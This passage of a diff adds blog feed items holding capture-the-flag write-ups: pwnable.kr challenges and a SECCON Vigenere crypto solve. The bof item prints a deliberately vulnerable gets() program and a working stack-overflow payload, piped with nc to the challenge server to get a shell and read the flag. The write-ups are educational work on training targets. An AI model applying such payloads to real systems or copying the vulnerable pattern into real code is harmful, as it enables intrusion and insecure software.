+   0x000000000040116c &amp;lt;+8&amp;gt;: mov    edi,0x496658
+   0x0000000000401171 &amp;lt;+13&amp;gt;:    call   0x402080 &amp;lt;puts&amp;gt;
+   0x0000000000401176 &amp;lt;+18&amp;gt;:    mov    edi,0x64
+   0x000000000040117b &amp;lt;+23&amp;gt;:    call   0x4099d0 &amp;lt;malloc&amp;gt;
+   0x0000000000401180 &amp;lt;+28&amp;gt;:    mov    QWORD PTR [rbp-0x8],rax
+   0x0000000000401184 &amp;lt;+32&amp;gt;:    mov    rdx,QWORD PTR [rip+0x2c0ee5]        # 0x6c2070 &amp;lt;flag&amp;gt;
+   0x000000000040118b &amp;lt;+39&amp;gt;:    mov    rax,QWORD PTR [rbp-0x8]
+   0x000000000040118f &amp;lt;+43&amp;gt;:    mov    rsi,rdx
+   0x0000000000401192 &amp;lt;+46&amp;gt;:    mov    rdi,rax
+   0x0000000000401195 &amp;lt;+49&amp;gt;:    call   0x400320
+   0x000000000040119a &amp;lt;+54&amp;gt;:    mov    eax,0x0
+   0x000000000040119f &amp;lt;+59&amp;gt;:    leave  
+   0x00000000004011a0 &amp;lt;+60&amp;gt;:    ret    
+End of assembler dump.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So it is basically giving us the flag at address 0x6c2070. Ok, then…&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ x/s \*0x6c2070
+0x496628:   &quot;UPX...? sounds like a delivery service :)&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;There you go!&lt;/p&gt;
+</description>
+				<pubDate>Thu, 15 Dec 2016 00:00:00 -0200</pubDate>
+				<link>/ctf/2016/12/15/pwnablekr-4.html</link>
+				<guid isPermaLink="true">/ctf/2016/12/15/pwnablekr-4.html</guid>
+			</item>
+		
+			<item>
+				<title>SECCON/2016 - Vigenere</title>
+				<description>&lt;p&gt;#Vigenere - Crypto 100&lt;/p&gt;
+
+&lt;p&gt;As the title for this chall claims, this is all about Vigenere cipher. Interestingly the alphabet used is not [A-Z], but also includes ‘{‘ and ‘}’. Besides giving us a full Vigenere table, the chall also provides some information about the key, the plaintext and the ciphertext.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;k: ????????????
+p: SECCON{???????????????????????????????????}
+c: LMIG}RPEDOEEWKJIQIWKJWMNDTSR}TFVUFWYOCBAJBQ
+
+k=key, p=plain, c=cipher, md5(p)=f528a6ab914c1ecf856a1d93103948fe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;From now on we are going to assume &lt;em&gt;len(k)==12&lt;/em&gt;. Our main goal is clearly to find &lt;em&gt;p&lt;/em&gt;. Since we have the first 7 chars of &lt;em&gt;p&lt;/em&gt; we could easily find the 7 first chars of &lt;em&gt;c&lt;/em&gt;. We could even use the given table and do it manually. For the first char of &lt;em&gt;p&lt;/em&gt;, &lt;em&gt;p[0]==’S’&lt;/em&gt;, we would check the row of the table corresponding to &lt;em&gt;S&lt;/em&gt;. Since &lt;em&gt;S&lt;/em&gt; gets mapped to &lt;em&gt;c[0]==’L’&lt;/em&gt;, we look for &lt;em&gt;L&lt;/em&gt; in this row, which is in the column of &lt;em&gt;V&lt;/em&gt;. The figure below ilustrates this process:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://marcosvalle.github.io/assets/img/vigenere.png&quot; alt=&quot;Vigenere&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pt = &quot;SECCON{&quot;
+ct = &quot;LMIG}RP&quot;
+
+res = &quot;&quot;
+for p,c in zip(pt, ct):
+    res += chr( ord('A') + ( (ord(c) - ord(p)) % 28) ) 
+
+print(res)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This simple procedure results in &lt;em&gt;VIGESEN&lt;/em&gt; as the first part of the key. Evidently the chars ‘{‘ and ‘}’ are not being correctly treated in positions 5 and 7. Either by correcting tem manually or by guessing, we might deduce that &lt;em&gt;VIGENER&lt;/em&gt; is indeed the first part. It is not hard to find that &lt;em&gt;VIGENERE&lt;/em&gt; are the first 8 chars of the key.&lt;/p&gt;
+
+&lt;p&gt;We have the following result so far:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;P: SECCON{A_ _ _ _BCDEDEFG_ _ _ _KLMNOPQR_ _ _ _VWXYYZ}
+K: VIGENERE_ _ _ _VIGENERE_ _ _ _VIGENERE_ _ _ _VIGENER
+C: LMIG}RPED O E EWKJIQIWKJ W M NDTSR}TFVU F W YOCBAJBQ
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It seems the alphabet is part of &lt;em&gt;p&lt;/em&gt;. After &lt;em&gt;G&lt;/em&gt; there might be &lt;em&gt;HIJ_&lt;/em&gt; or maybe &lt;em&gt;_HIJ&lt;/em&gt;. The same goes for &lt;em&gt;STU_&lt;/em&gt; or &lt;em&gt;_STU&lt;/em&gt; right after &lt;em&gt;R&lt;/em&gt;. Before going for a bruteforce solution we decided to test a few possibilities manually. We tried &lt;em&gt;H&lt;/em&gt; in position 23 and &lt;em&gt;S&lt;/em&gt; in position 32. Surprisingly, we got &lt;em&gt;C&lt;/em&gt; as the result for the key in both cases. Certainly a good sign. Trying the other chars we got &lt;em&gt;VIGENERECOD_&lt;/em&gt; for the key. Not hard to guess the answer should be &lt;em&gt;VIGENERECODE&lt;/em&gt;, proving our first guess was correct!&lt;/p&gt;
+
+&lt;p&gt;With the key in hands all we had to do was decode the ciphertext in order to obtain &lt;strong&gt;SECCON{ABABABCDEDEFGHIJJKLMNOPQRSTTUVWXYYZ}&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Although we used a lot of guessing to make things quicker, our next approach would be bruteforcing the given md5 hash. In fact, we decided to confirm our guesses with a little coding:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import itertools
+import hashlib
+import binascii
+
+keyBase = &quot;VIGENERE&quot;
+hashChall = &quot;f528a6ab914c1ecf856a1d93103948fe&quot;
+res = &quot;&quot;
+
+# the range could include the whole alphabet for more extensive search
+for a in itertools.product(&quot;AB&quot;,repeat=4):
+    for b in itertools.product(&quot;HIJJ&quot;,repeat=4):
+        for c in itertools.product(&quot;STTU&quot;,repeat=4):
+            pt = &quot;SECCON{A&quot;+&quot;&quot;.join(a)+&quot;BCDEDEFG&quot;+&quot;&quot;.join(b)+&quot;KLMNOPQR&quot;+&quot;&quot;.join(c)+&quot;VWXYYZ}&quot;
+            hashTst = hashlib.md5(pt.encode('utf-8')).hexdigest()
+            if hashTst == hashChall:
+                res = pt
+print(res)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+				<pubDate>Tue, 13 Dec 2016 00:00:00 -0200</pubDate>
+				<link>/ctf/2016/12/13/seccon-vigenere.html</link>
+				<guid isPermaLink="true">/ctf/2016/12/13/seccon-vigenere.html</guid>
+			</item>
+		
+			<item>
+				<title>Pwnable.kr - bof.c [3]</title>
+				<description>&lt;p&gt;Pwnable.kr’s third challenge goes like this:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Nana told me that buffer overflow is one of the most common software vulnerability. 
+Is that true?
+
+Download : http://pwnable.kr/bin/bof
+Download : http://pwnable.kr/bin/bof.c
+
+Running at : nc pwnable.kr 900
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let us first download &lt;em&gt;bof.c&lt;/em&gt; file from the given link and compile it under x86 architecture:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc -m32 bof.c -o bof
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This is the first time we meet the beautiful beast called &lt;em&gt;buffer overflow&lt;/em&gt; (mistery emphasis sound). Although very simple in this case, there are some gotchas that will really pull your leg in case you want to fully understand what is going on. Like those missing pieces in a puzzle that are in fact little secrets nobody actually tells you :)&lt;/p&gt;
+
+&lt;p&gt;In case you are surprised, I am talking about compiler optimizations. Keep this in mind: the code you write is not the code the machine runs. Indeed, if you translate your &lt;em&gt;C&lt;/em&gt; code to &lt;em&gt;Assembly&lt;/em&gt; by hand you would probably be very surprised how different they are, even if you don’t make any stupid mistakes - which you will. The main point so far is you should not try to predict your compiled code but instead you should debug it and believe only what you see there.&lt;/p&gt;
+
+&lt;p&gt;Enough of this senseless introduction. After all, if you came to this page you probably have no idea of what this is all about.&lt;/p&gt;
+
+&lt;h2 id=&quot;the-stack&quot;&gt;The stack&lt;/h2&gt;
+&lt;p&gt;The internet is full of silly tutorials and blog posts about the stack and how buffer overflows work. In case you need some references, go for the classical &lt;a href=&quot;https://www.eecs.umich.edu/courses/eecs588.w14/static/stack_smashing.pdf&quot;&gt;Smashing the Stack for fun and Profit&lt;/a&gt; and the amazing &lt;a href=&quot;http://duartes.org/gustavo/blog/post/journey-to-the-stack/&quot;&gt;Journey to the Stack&lt;/a&gt;. I will consider you now understand the basics about this stuff.&lt;/p&gt;
+
+&lt;p&gt;First let us take a look at &lt;em&gt;bof.c&lt;/em&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+void func(int key){
+    char overflowme[32];
+    printf(&quot;overflow me : &quot;);
+    gets(overflowme);   // smash me!
+    if(key == 0xcafebabe){
+        system(&quot;/bin/sh&quot;);
+    }   
+    else{
+        printf(&quot;Nah..\n&quot;);
+    }   
+}
+int main(int argc, char\* argv[]){
+    func(0xdeadbeef);
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;My idea here is to solve this chall while showing step by step how the stack would look like. When &lt;em&gt;main()&lt;/em&gt; calls &lt;em&gt;func()&lt;/em&gt;, here is what we should have:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;main | 0xdeadbeef | RET VAL | SAVED EBP | overflowme
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;What we want to do is send a big input such that &lt;em&gt;gets()&lt;/em&gt; will read more than our buffer size (32 bytes) into the stack. C is a powerfull language, it allows you to do pretty much everything with the memory, for better or worse. If we send more than 32 bytes to our program it will not simply crash. It will instead overflow other positions in the stack, altering its values! If we do things right we might even get to &lt;em&gt;key&lt;/em&gt; value in the stack and put &lt;em&gt;0xcaffebabe&lt;/em&gt; in there.&lt;/p&gt;
+
+&lt;p&gt;Now, how many bytes exactly would we need to send? Let’s say we will send &lt;em&gt;AAA…A\xbe\xba\xfe\xca&lt;/em&gt;. How many padding &lt;em&gt;A&lt;/em&gt;’s do we need? Looking at our stack diagram you might say “Dã, 32+4+4 = 40”. So we would need to send 40 &lt;em&gt;A&lt;/em&gt;’s and then append our new &lt;em&gt;key&lt;/em&gt; value (notice the little endian notation), right? Sadly no.&lt;/p&gt;
+
+&lt;p&gt;Remember when I said you should not try to predict your compiled code? Here is an example why. The stack does not behave like that in practice due to compiler optimizations. I might write a post about it some other time but for now you might want to check &lt;a href=&quot;https://stackoverflow.com/questions/20865235/why-gcc-disassembler-allocating-extra-space-for-local-variable&quot;&gt;this SO answer&lt;/a&gt; and this cool paper(https://wr.informatik.uni-hamburg.de/_media/teaching/wintersemester_2013_2014/epc-14-haase-svenhendrik-alignmentinc-paper.pdf). Instead, here is how it actually looks like:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;main | 0xdeadbeef | RET VAL | SAVED EBP | 0x00000003 | 0x00000001 | 0x67368200  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;debugging&quot;&gt;Debugging&lt;/h2&gt;
+&lt;p&gt;You might be asking how the heck do I know it? All the answers rely on &lt;a href=&quot;https://www.tutorialspoint.com/gnu_debugger/&quot;&gt;GDB&lt;/a&gt;. Plus, you should also be using &lt;a href=&quot;https://github.com/longld/peda&quot;&gt;PEDA&lt;/a&gt; from now on for everything related to RE, PWNing, exploits and other creatures alike. Fire up your debugger:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$gdb .bof
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now let’s see how our assembly code looks like:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ disassemble main
+Dump of assembler code for function main:
+   0x0804856a &amp;lt;+0&amp;gt;: lea    ecx,[esp+0x4]
+   0x0804856e &amp;lt;+4&amp;gt;: and    esp,0xfffffff0
+   0x08048571 &amp;lt;+7&amp;gt;: push   DWORD PTR [ecx-0x4]
+   0x08048574 &amp;lt;+10&amp;gt;:    push   ebp
+   0x08048575 &amp;lt;+11&amp;gt;:    mov    ebp,esp
+   0x08048577 &amp;lt;+13&amp;gt;:    push   ecx
+   0x08048578 &amp;lt;+14&amp;gt;:    sub    esp,0x4
+   0x0804857b &amp;lt;+17&amp;gt;:    sub    esp,0xc
+   0x0804857e &amp;lt;+20&amp;gt;:    push   0xdeadbeef
+   0x08048583 &amp;lt;+25&amp;gt;:    call   0x80484fb &amp;lt;func&amp;gt;
+   0x08048588 &amp;lt;+30&amp;gt;:    add    esp,0x10
+   0x0804858b &amp;lt;+33&amp;gt;:    mov    eax,0x0
+   0x08048590 &amp;lt;+38&amp;gt;:    mov    ecx,DWORD PTR [ebp-0x4]
+   0x08048593 &amp;lt;+41&amp;gt;:    leave  
+   0x08048594 &amp;lt;+42&amp;gt;:    lea    esp,[ecx-0x4]
+   0x08048597 &amp;lt;+45&amp;gt;:    ret    
+End of assembler dump.
+gdb-peda$ disassemble func
+Dump of assembler code for function func:
+   0x080484fb &amp;lt;+0&amp;gt;: push   ebp
+   0x080484fc &amp;lt;+1&amp;gt;: mov    ebp,esp
+   0x080484fe &amp;lt;+3&amp;gt;: sub    esp,0x38
+   0x08048501 &amp;lt;+6&amp;gt;: mov    eax,gs:0x14
+   0x08048507 &amp;lt;+12&amp;gt;:    mov    DWORD PTR [ebp-0xc],eax
+   0x0804850a &amp;lt;+15&amp;gt;:    xor    eax,eax
+   0x0804850c &amp;lt;+17&amp;gt;:    sub    esp,0xc
+   0x0804850f &amp;lt;+20&amp;gt;:    push   0x8048620
+   0x08048514 &amp;lt;+25&amp;gt;:    call   0x8048390 &amp;lt;printf@plt&amp;gt;
+   0x08048519 &amp;lt;+30&amp;gt;:    add    esp,0x10
+   0x0804851c &amp;lt;+33&amp;gt;:    sub    esp,0xc
+   0x0804851f &amp;lt;+36&amp;gt;:    lea    eax,[ebp-0x2c]
+   0x08048522 &amp;lt;+39&amp;gt;:    push   eax
+   0x08048523 &amp;lt;+40&amp;gt;:    call   0x80483a0 &amp;lt;gets@plt&amp;gt;
+   0x08048528 &amp;lt;+45&amp;gt;:    add    esp,0x10
+   0x0804852b &amp;lt;+48&amp;gt;:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
+   0x08048532 &amp;lt;+55&amp;gt;:    jne    0x8048546 &amp;lt;func+75&amp;gt;
+   0x08048534 &amp;lt;+57&amp;gt;:    sub    esp,0xc
+   0x08048537 &amp;lt;+60&amp;gt;:    push   0x804862f
+   0x0804853c &amp;lt;+65&amp;gt;:    call   0x80483d0 &amp;lt;system@plt&amp;gt;
+   0x08048541 &amp;lt;+70&amp;gt;:    add    esp,0x10
+   0x08048544 &amp;lt;+73&amp;gt;:    jmp    0x8048556 &amp;lt;func+91&amp;gt;
+   0x08048546 &amp;lt;+75&amp;gt;:    sub    esp,0xc
+   0x08048549 &amp;lt;+78&amp;gt;:    push   0x8048637
+   0x0804854e &amp;lt;+83&amp;gt;:    call   0x80483c0 &amp;lt;puts@plt&amp;gt;
+   0x08048553 &amp;lt;+88&amp;gt;:    add    esp,0x10
+   0x08048556 &amp;lt;+91&amp;gt;:    nop
+   0x08048557 &amp;lt;+92&amp;gt;:    mov    eax,DWORD PTR [ebp-0xc]
+   0x0804855a &amp;lt;+95&amp;gt;:    xor    eax,DWORD PTR gs:0x14
+   0x08048561 &amp;lt;+102&amp;gt;:   je     0x8048568 &amp;lt;func+109&amp;gt;
+   0x08048563 &amp;lt;+104&amp;gt;:   call   0x80483b0 &amp;lt;__stack_chk_fail@plt&amp;gt;
+   0x08048568 &amp;lt;+109&amp;gt;:   leave  
+   0x08048569 &amp;lt;+110&amp;gt;:   ret    
+End of assembler dump.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Don’t panic! Skimm through this bunch of letters and get only what really matters. Our goal here is to overflow the variable (surprise!) &lt;em&gt;overflowme&lt;/em&gt; so that we can control the value of &lt;em&gt;key&lt;/em&gt;. First thing we need is to add a breakpoint just before we call &lt;em&gt;gets()&lt;/em&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ break \*0x08048523
+Breakpoint 1 at 0x8048523
+gdb-peda$ run
+Starting program: /tmp/bof 
+
+ [----------------------------------registers-----------------------------------]
+EAX: 0xffffcedc --&amp;gt; 0xcd57 
+EBX: 0x0 
+ECX: 0x804b016 --&amp;gt; 0x0 
+EDX: 0xf7fa9870 --&amp;gt; 0x0 
+ESI: 0xf7fa8000 --&amp;gt; 0x1b1db0 
+EDI: 0xf7fa8000 --&amp;gt; 0x1b1db0 
+EBP: 0xffffcf08 --&amp;gt; 0xffffcf28 --&amp;gt; 0x0 
+ESP: 0xffffcec0 --&amp;gt; 0xffffcedc --&amp;gt; 0xcd57 
+EIP: 0x8048523 (&amp;lt;func+40&amp;gt;:  call   0x80483a0 &amp;lt;gets@plt&amp;gt;)
+EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804851c &amp;lt;func+33&amp;gt;: sub    esp,0xc
+   0x804851f &amp;lt;func+36&amp;gt;: lea    eax,[ebp-0x2c]
+   0x8048522 &amp;lt;func+39&amp;gt;: push   eax
+=&amp;gt; 0x8048523 &amp;lt;func+40&amp;gt;: call   0x80483a0 &amp;lt;gets@plt&amp;gt;
+   0x8048528 &amp;lt;func+45&amp;gt;: add    esp,0x10
+   0x804852b &amp;lt;func+48&amp;gt;: cmp    DWORD PTR [ebp+0x8],0xcafebabe
+   0x8048532 &amp;lt;func+55&amp;gt;: jne    0x8048546 &amp;lt;func+75&amp;gt;
+   0x8048534 &amp;lt;func+57&amp;gt;: sub    esp,0xc
+Guessed arguments:
+arg[0]: 0xffffcedc --&amp;gt; 0xcd57 
+[------------------------------------stack-------------------------------------]
+0000| 0xffffcec0 --&amp;gt; 0xffffcedc --&amp;gt; 0xcd57 
+0004| 0xffffcec4 --&amp;gt; 0xf7ffd918 --&amp;gt; 0x0 
+0008| 0xffffcec8 --&amp;gt; 0xffffcee0 --&amp;gt; 0xffffffff 
+0012| 0xffffcecc --&amp;gt; 0x804829f (&quot;_\_libc_start_main&quot;)
+0016| 0xffffced0 --&amp;gt; 0x0 
+0020| 0xffffced4 --&amp;gt; 0xffffcf74 --&amp;gt; 0xaedfbccf 
+0024| 0xffffced8 --&amp;gt; 0xf7fa8000 --&amp;gt; 0x1b1db0 
+0028| 0xffffcedc --&amp;gt; 0xcd57 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x08048523 in func ()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Since we don’t want to enter the &lt;em&gt;gets()&lt;/em&gt; function, let’s just skip it&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ next
+overflow me : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+ [----------------------------------registers-----------------------------------]
+EAX: 0xffffcedc ('A' &amp;lt;repeats 32 times&amp;gt;)
+EBX: 0x0 
+ECX: 0xf7fa85a0 --&amp;gt; 0xfbad2288 
+EDX: 0xf7fa987c --&amp;gt; 0x0 
+ESI: 0xf7fa8000 --&amp;gt; 0x1b1db0 
+EDI: 0xf7fa8000 --&amp;gt; 0x1b1db0 
+EBP: 0xffffcf08 --&amp;gt; 0xffffcf28 --&amp;gt; 0x0 
+ESP: 0xffffcec0 --&amp;gt; 0xffffcedc ('A' &amp;lt;repeats 32 times&amp;gt;)
+EIP: 0x8048528 (&amp;lt;func+45&amp;gt;:  add    esp,0x10)
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804851f &amp;lt;func+36&amp;gt;: lea    eax,[ebp-0x2c]
+   0x8048522 &amp;lt;func+39&amp;gt;: push   eax
+   0x8048523 &amp;lt;func+40&amp;gt;: call   0x80483a0 &amp;lt;gets@plt&amp;gt;
+=&amp;gt; 0x8048528 &amp;lt;func+45&amp;gt;: add    esp,0x10
+   0x804852b &amp;lt;func+48&amp;gt;: cmp    DWORD PTR [ebp+0x8],0xcafebabe
+   0x8048532 &amp;lt;func+55&amp;gt;: jne    0x8048546 &amp;lt;func+75&amp;gt;
+   0x8048534 &amp;lt;func+57&amp;gt;: sub    esp,0xc
+   0x8048537 &amp;lt;func+60&amp;gt;: push   0x804862f
+[------------------------------------stack-------------------------------------]
+0000| 0xffffcec0 --&amp;gt; 0xffffcedc ('A' &amp;lt;repeats 32 times&amp;gt;)
+0004| 0xffffcec4 --&amp;gt; 0xf7ffd918 --&amp;gt; 0x0 
+0008| 0xffffcec8 --&amp;gt; 0xffffcee0 ('A' &amp;lt;repeats 28 times&amp;gt;)
+0012| 0xffffcecc --&amp;gt; 0x804829f (&quot;_\_libc_start_main&quot;)
+0016| 0xffffced0 --&amp;gt; 0x0 
+0020| 0xffffced4 --&amp;gt; 0xffffcf74 --&amp;gt; 0xaedfbccf 
+0024| 0xffffced8 --&amp;gt; 0xf7fa8000 --&amp;gt; 0x1b1db0 
+0028| 0xffffcedc ('A' &amp;lt;repeats 32 times&amp;gt;)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x08048528 in func ()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This is why we love debuggers. We can stop in the middle of the execution and inspect what is going on behind the curtains. How is the stack right now, just after we pass 32 &lt;em&gt;A&lt;/em&gt;’s?&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ x/16x $ebp-52
+0xffffced4: 0xffffcf74  0xf7fa8000  0x41414141  0x41414141
+0xffffcee4: 0x41414141  0x41414141  0x41414141  0x41414141
+0xffffcef4: 0x41414141  0x41414141  0x67368200  0x00000001
+0xffffcf04: 0x00000003  0xffffcf28  0x08048588  0xdeadbeef
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We are showing here the stack from 52 bytes under EBP until &lt;em&gt;0xdeadbeef&lt;/em&gt;. Please notice that the gcc aligns bytes in blocks of 16. Due to this alignment and possibly other optimizations, the compiler adds 3 more groups of 16 bytes each!&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x67368200  0x00000001  0x00000003 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ok, so now we know we must prepend 3*4 more &lt;em&gt;A&lt;/em&gt;’s to our payload. An elegant way of printing our payload is:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ (python2.7 -c 'print &quot;A&quot; * 52 + &quot;\xbe\xba\xfe\xca&quot;')
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;All right, now we just need to send it to the server and get our flag! Sending&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ (python2.7 -c 'print &quot;A&quot; * 52 + &quot;\xbe\xba\xfe\xca&quot;') | nc pwnable.kr 9000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Will result in the shell being closed just after being opened. In order to keep it open we use the &lt;em&gt;cat -&lt;/em&gt; trick. If you have never seen it, get used to, because it is really useful:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ (python2.7 -c 'print &quot;A&quot; * 52 + &quot;\xbe\xba\xfe\xca&quot;'; cat -) | nc pwnable.kr 9000
+ls
+bof
+bof.c
+flag
+log
+log2
+super.pl
+cat flag
+daddy, I just pwned a buFFer :)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;There you go! :)&lt;/p&gt;
+</description>
+				<pubDate>Fri, 09 Dec 2016 00:00:00 -0200</pubDate>
+				<link>/ctf/2016/12/09/pwnablekr-3.html</link>
+				<guid isPermaLink="true">/ctf/2016/12/09/pwnablekr-3.html</guid>
+			</item>
+		
+			<item>
+				<title>Pwnable.kr - collision [2]</title>
+				<description>&lt;p&gt;Pwnable.kr’s second challenge goes like this:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Daddy told me about cool MD5 hash collision today.
+I wanna do something like that too!
+
+ssh col@pwnable.kr -p2222 (pw:guest)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let us first download &lt;em&gt;col.c&lt;/em&gt; file from server.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;scp -P 2222 col@pwnable.kr:col.c .
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, compiling it under x86 architecture:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc -m32 col.c
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let us check what this little beaver does when given a dummy input:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    $ ./a.out 123
+    passcode length should be 20 bytes
+    $ ./a.out 01234567890123456789
+    wrong passcode.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Checking the source code we can clearly understand what the program does. After receiving the input and checking its length, the script compares return value of &lt;em&gt;check_password( )&lt;/em&gt; with the value of &lt;em&gt;0x21DD09EC&lt;/em&gt;. Here is the function’s code:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    unsigned long check_password(const char\* p){ 
+        int* ip = (int*)p;
+        int i;
+        int res=0;
+        for(i=0; i&amp;lt;5; i++){
